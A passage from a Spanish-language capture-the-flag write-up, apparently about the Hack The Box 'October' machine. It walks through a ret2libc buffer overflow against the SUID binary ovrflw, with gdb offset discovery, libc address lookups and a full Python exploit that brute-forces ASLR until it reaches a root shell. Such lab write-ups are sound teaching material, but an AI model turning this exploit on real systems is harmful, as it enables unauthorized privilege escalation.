Invalid <span class="nv">$PC</span> address: 0x41414141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xbfc828d0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0004| 0xbfc828d4 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0008| 0xbfc828d8 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0012| 0xbfc828dc <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0016| 0xbfc828e0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0020| 0xbfc828e4 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0024| 0xbfc828e8 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
0028| 0xbfc828ec <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
gdb-peda<span class="nv">$ </span>i r
eax            0x0      0x0
ecx            0xbf9c4e70       0xbf9c4e70
edx            0xbf9c3bf3       0xbf9c3bf3
ebx            0xb76f0000       0xb76f0000
esp            0xbf9c3a80       0xbf9c3a80
ebp            0x41414141       0x41414141
esi            0x0      0x0
edi            0x0      0x0
eip            0x41414141       0x41414141
eflags         0x10202  <span class="o">[</span> IF RF <span class="o">]</span>
cs             0x73     0x73
ss             0x7b     0x7b
ds             0x7b     0x7b
es             0x7b     0x7b
fs             0x0      0x0
gs             0x33     0x33
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>Como podemos ver, el programa nos manda la leyenda <em>Segmentation fault</em> y vemos que los registros <code class="language-plaintext highlighter-rouge">ebp</code> y <code class="language-plaintext highlighter-rouge">eip</code> han cambiado su valor por la cadena que le introducimos “<em>A - (0x41)</em>”. Por lo tanto, necesitamos saber cual es el límite antes de cambiar los registros; ésto lo podemos lograr con el comando <code class="language-plaintext highlighter-rouge">pattern_create</code> desde <code class="language-plaintext highlighter-rouge">peda</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_create 500
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>Ahora copiamos la cadena obtenida y la pasamos como argumento:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>r <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8A
ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A
%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA
%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>  
Starting program: /usr/local/bin/ovrflw <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5
AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%n
A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%R
A%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsI
AseAs4AsJAsfAs5AsKAsgAs6A'</span>                                                                                                       
                                                                                                                                 
Program received signal SIGSEGV, Segmentation fault.                                                                             
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>                                                 
EAX: 0x0 
EBX: 0xb7783000 <span class="nt">--</span><span class="o">&gt;</span> 0x1abda8 
ECX: 0xbfcdfe70 <span class="o">(</span><span class="s2">"As5AsKAsgAs6A"</span><span class="o">)</span>
EDX: 0xbfcddc73 <span class="o">(</span><span class="s2">"As5AsKAsgAs6A"</span><span class="o">)</span>
ESI: 0x0 
EDI: 0x0 
EBP: 0x6941414d <span class="o">(</span><span class="s1">'MAAi'</span><span class="o">)</span>
ESP: 0xbfcddb00 <span class="o">(</span><span class="s2">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"</span>...<span class="o">)</span>
EIP: 0x41384141 <span class="o">(</span><span class="s1">'AA8A'</span><span class="o">)</span>
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41384141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xbfcddb00 <span class="o">(</span><span class="s2">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"</span>...<span class="o">)</span>
0004| 0xbfcddb04 <span class="o">(</span><span class="s2">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"</span>...<span class="o">)</span>
0008| 0xbfcddb08 <span class="o">(</span><span class="s2">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%"</span>...<span class="o">)</span>
0012| 0xbfcddb0c <span class="o">(</span><span class="s2">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"</span>...<span class="o">)</span>
0016| 0xbfcddb10 <span class="o">(</span><span class="s2">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA"</span>...<span class="o">)</span>
0020| 0xbfcddb14 <span class="o">(</span><span class="s2">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"</span>...<span class="o">)</span>
0024| 0xbfcddb18 <span class="o">(</span><span class="s2">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%Q"</span>...<span class="o">)</span>
0028| 0xbfcddb1c <span class="o">(</span><span class="s2">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%</span><span class="nv">$A</span><span class="s2">%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"</span>...<span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41384141 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>Ahora, tomamos la última dirección que se nos muestra <code class="language-plaintext highlighter-rouge">0x41384141 in ?? ()</code> y ocupamos el comando <code class="language-plaintext highlighter-rouge">pattern_offset</code> para determinar la longitud del buffer antes de que se cambien los registros.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41384141
1094205761 found at offset: 112
gdb-peda<span class="nv">$ </span>
</code></pre></div></div>

<p>Para este caso, vemos que el buffer tiene un tamaño de 112; es decir,  que la longitud de caracteres antes de modificar el valor del registro <code class="language-plaintext highlighter-rouge">ebp</code> es de 112. Para modificar el valor del registro <code class="language-plaintext highlighter-rouge">eip</code> es el buffer(112) + ebp(4).</p>

<p>Checando las librerías compartidas del programa, vemos lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:~<span class="nv">$ </span>ldd /usr/local/bin/ovrflw
        linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xb77fe000<span class="o">)</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7644000<span class="o">)</span>
        /lib/ld-linux.so.2 <span class="o">(</span>0x8003c000<span class="o">)</span>
www-data@october:~<span class="err">$</span>
</code></pre></div></div>

<p>En este caso, tenemos <strong>libc</strong>, por lo que debemos ya estar pensando en un <strong><em>Ret2libc</em></strong>, que es una técnica que se basa en ejecutar código que no se encuentra en la pila sino en un sector de la memoria de libc, que es ejecutable; es decir, el código utilizado para vulnerar el programa son funciones dentro de esta librería.</p>

<p>Una forma de ver el ASLR es ejecutando el comando <code class="language-plaintext highlighter-rouge">ldd</code> y podemos ver como las direcciones van cambiando, pero hay que tener en cuenta que las direcciones se repiten de forma aleatoria; esto es un punto importante que debemos tener en cuenta para la explotación del <em>Buffer Overflow</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:~<span class="nv">$ </span>ldd /usr/local/bin/ovrflw
        linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xb777b000<span class="o">)</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb75c1000<span class="o">)</span>
        /lib/ld-linux.so.2 <span class="o">(</span>0x80050000<span class="o">)</span>
www-data@october:~<span class="nv">$ </span>ldd /usr/local/bin/ovrflw
        linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xb7781000<span class="o">)</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb75c7000<span class="o">)</span>
        /lib/ld-linux.so.2 <span class="o">(</span>0x800dc000<span class="o">)</span>
www-data@october:~<span class="err">$</span>
www-data@october:~<span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 1000<span class="si">)</span><span class="p">;</span> <span class="k">do </span>ldd /usr/local/bin/ovrflw<span class="p">;</span> <span class="k">done</span> | <span class="nb">grep </span>libc | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'()'</span> | <span class="nb">grep </span>0xb75c7000
0xb75c7000
0xb75c7000
www-data@october:~<span class="err">$</span>
</code></pre></div></div>

<p>Ahora, para nuestro script de <em>buffer overflow</em> debemos tener presente la siguiente secuencia de envío de datos:</p>

<p><img src="/assets/images/htb-october/october-ret2libc.png" alt="" /></p>

<ul>
  <li>Junk: Los datos a introducir que llenan el buffer, para este caso son 112 caracteres.</li>
  <li>Payload: Llamada a la librería <em>libc</em> la cual cuenta con funciones útiles. Esta se divide en tres partes:
    <ul>
      <li>System address: La dirección de la llamada a la función system.</li>
      <li>Exit address: La dirección del código de estado.</li>
      <li>Binario address: La dirección de la <code class="language-plaintext highlighter-rouge">/bin/sh</code> que utilizaremos para que <strong>root</strong> nos la ejecute.</li>
    </ul>
  </li>
</ul>

<p>Debido a que se está aplicando ASLR, debemos obtener la dirección base de <em>libc</em> que para este caso será <code class="language-plaintext highlighter-rouge">0xb75c7000</code> (este valor se obtiene ejecutando el comando <code class="language-plaintext highlighter-rouge">ldd</code>). Ahora debemos de obtener las direciones de las funciones <em>system address</em> y <em>exit address</em> a la librería <em>libc</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:~<span class="nv">$ </span>readelf <span class="nt">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"</span><span class="se">\s</span><span class="s2">system|</span><span class="se">\s</span><span class="s2">exit"</span>
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 <span class="nb">exit</span>@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:~<span class="err">$</span>
</code></pre></div></div>

<p>Por útimo nos falta la dirección de la <code class="language-plaintext highlighter-rouge">/bin/sh</code> de la librería <em>libc</em>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:~<span class="nv">$ </span>strings <span class="nt">-a</span> <span class="nt">-t</span> x /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="s2">"/bin/sh"</span>           
 162bac /bin/sh
www-data@october:~<span class="nv">$ </span>
</code></pre></div></div>

<p>Retomando todo lo anterior, tenemos lo siguiente:</p>
<ul>
  <li>offset = 112</li>
  <li>base_libc = 0xb75c7000</li>
  <li>junk = “A”*offset</li>
  <li>system_addr_offset = 0x00040310</li>
  <li>exit_addr_offset = 0x00033260</li>
  <li>bin_sh_addr_offset = 0x00162bac</li>
</ul>

<p>Debido al ASLR, para calcular las direcciones reales para cuando <em>base_libc</em> vale <code class="language-plaintext highlighter-rouge">0xb75c7000</code> tenemos que sumarles dicho valor a los <em>offsets</em> de la funciones:</p>
<ul>
  <li>system_addr = base_libc + system_addr_offset</li>
  <li>exit_addr = base_libc + exit_addr_offset</li>
  <li>bin_sh_addr = base_libc + bin_sh_addr_offset</li>
</ul>

<p>Y el valor del payload completo sería:</p>
<ul>
  <li>payload = junk + system_addr + exit_addr + bin_sh_addr</li>
</ul>

<p>Ahora si, con todo esto, ya podemos armar nuestro programa en python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
        <span class="n">base_libc</span> <span class="o">=</span> <span class="mh">0xb75c7000</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
        <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>

        <span class="c1"># ret2libc -&gt; system_addr + exit_addr + bin_sh_addr
</span>        <span class="n">system_addr_offset</span> <span class="o">=</span> <span class="mh">0x00040310</span>
        <span class="n">exit_addr_offset</span> <span class="o">=</span> <span class="mh">0x00033260</span>
        <span class="n">bin_sh_addr_offset</span> <span class="o">=</span> <span class="mh">0x00162bac</span>

        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">system_addr_offset</span><span class="p">)</span>
        <span class="n">exit_addr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">exit_addr_offset</span><span class="p">)</span>
        <span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="n">bin_sh_addr_offset</span><span class="p">)</span>

        <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">system_addr</span> <span class="o">+</span> <span class="n">exit_addr</span> <span class="o">+</span> <span class="n">bin_sh_addr</span>

        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="s">"/usr/local/bin/ovrflw"</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>
                <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
                        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Como el programa tiene permisos SUID, podemos ejecutarlo temporalmente como el propietario, en este caso <strong>root</strong>. Ejecutamos el script que hicimos y tenemos que esperar a que el valor de <em>libc</em> sea el que nosotros le indicamos; para este caso <code class="language-plaintext highlighter-rouge">0xb75c7000</code>. En caso de que llevemos un buen rato y no vemos el símbolo <code class="language-plaintext highlighter-rouge">#</code> de la <code class="language-plaintext highlighter-rouge">/bin/sh</code>, podríamos probar con otro valor de <em>libc</em> sin alterar el programa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:~<span class="nv">$ </span>python bof.py 
<span class="k">***</span> Error <span class="k">in</span> <span class="sb">`</span>/usr/local/bin/ovrflw<span class="s1">': munmap_chunk(): invalid pointer: 0xbff7fe7b ***
*** Error in `/usr/local/bin/ovrflw'</span>: free<span class="o">()</span>: invalid pointer: 0x08048380 <span class="k">***</span>
<span class="k">***</span> Error <span class="k">in</span> <span class="sb">`</span>/usr/local/bin/ovrflw<span class="s1">': munmap_chunk(): invalid pointer: 0xbfb91e7b ***
Syntax: Z
         $$D$
              &lt;input string&gt;
ovrflw: uv
          :3217394944: 6#: Assertion `'</span> failed.
Syntax: Z
         <span class="nv">$$</span>D<span class="err">$</span>
              &lt;input string&gt;
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<p>A este punto ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-21T00:00:00-05:00">September 21, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-granny/" class="pagination--pager" title="Hack The Box Granny
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
